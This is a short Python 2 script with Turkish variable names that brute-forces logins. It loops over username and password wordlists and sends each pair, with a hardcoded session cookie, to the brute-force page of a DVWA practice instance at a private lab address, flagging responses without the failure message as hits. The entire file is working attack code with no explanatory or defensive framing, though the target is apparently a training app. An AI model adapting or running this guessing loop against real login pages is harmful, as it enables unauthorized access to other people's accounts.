import requests
dosya=open("username.txt","r")
username=dosya.read()
dosya.close()
dosya=open("password.txt","r")
password=dosya.read()
dosya.close()
for user in username.split("\n"):
	for passwd in password.split("\n"):
		url="http://10.10.10.20/dvwa/vulnerabilities/brute/?username="+user+"&password="+passwd+"&Login=Login"
		header={"Content-Type":"text/html","Cookie":"Cookie: security=low; PHPSESSID=9e6f6a3b34cfa7ef5688c623249ad356"}
		sonuc = requests.get(url=url,headers=header)
		if not "Username and/or password incorrect." in sonuc.content:
			print "[+]",user,"-",passwd,"-",sonuc.status_code,"-",sonuc.headers['Content-Length']
		else:
			print "[-]",user,"-",passwd,"-",sonuc.status_code,"-",sonuc.headers['Content-Length']
